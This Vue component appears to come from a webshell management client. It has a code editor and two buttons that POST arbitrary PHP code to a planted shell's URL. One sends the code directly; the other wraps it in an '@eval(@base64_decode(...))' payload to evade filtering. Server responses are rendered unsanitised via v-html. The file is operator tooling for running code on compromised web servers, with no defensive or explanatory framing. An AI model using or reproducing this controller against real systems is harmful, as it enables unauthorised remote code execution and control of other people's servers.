<template>
    <div id="content">
        <c-header>
            <div class="pull-right">
                <select id="mode" v-model="mode">
                    <option value="html">HTML</option>
                    <option value="php">PHP</option>
                    <option value="java">JAVA</option>
                    <option value="sql">SQL</option>
                    <option value="nginx">Nginx</option>
                    <option value="markdown">Markdown</option>
                    <option value="javascript">JS</option>
                    <option value="jsx">JSX</option>
                    <option value="vue">VUE</option>
                    <option value="css">CSS</option>
                </select>
                <c-button style="margin-left: 10px;" @click="send">发送</c-button>
                <c-button style="margin-left: 10px;" @click="sendBase64">Base64发送</c-button>
            </div>
        </c-header>
        <CodeEditor class="editor" ref="editor" :mode="mode" :content="content"></CodeEditor>
        <div class="html" v-html="res"></div>
    </div>
</template>

<script>
    import File from '../../template/php/file.js'
    import crypto from '../../utils/crypto'
    import CodeEditor from '@/components/editor'


    export default {
        name: 'codeExec',
        components: {
            CodeEditor
        },
        data() {
            return {
                theme: 'idea',
                mode: 'vue',
                editor: null,
                shell: null,
                res: null,
                content: ` phpinfo();
                `
            }
        },
        created() {
            this.shell = JSON.parse(this.$route.query.shell)
        },
        methods: {
            async send() {
                let content = this.$refs.editor.getValue()
                let res = await this.$request(this.shell.url, {c: encodeURIComponent(content)}, {}, 'post')
                this.res = res
            },
            async sendBase64() {
                let content = this.$refs.editor.getValue()
                let base64Str = crypto.base64Encode(content)
                base64Str = encodeURIComponent(base64Str)
                console.log(base64Str)
                let res = await this.$request(this.shell.url, {
                    c: `@eval(@base64_decode('${base64Str}'));`
                }, {}, 'post')
                this.res = res
            },
        },
    }
</script>

<style lang="less" scoped>
    @import "../../assets/less/color";

    #content {
        overflow: auto;
        height: 100%;
        // background: @main-bg-color;
        font-size: 18px;

        .editor {
            height: 50%;
        }

        .html {
            background: white;
        }
    }

</style>
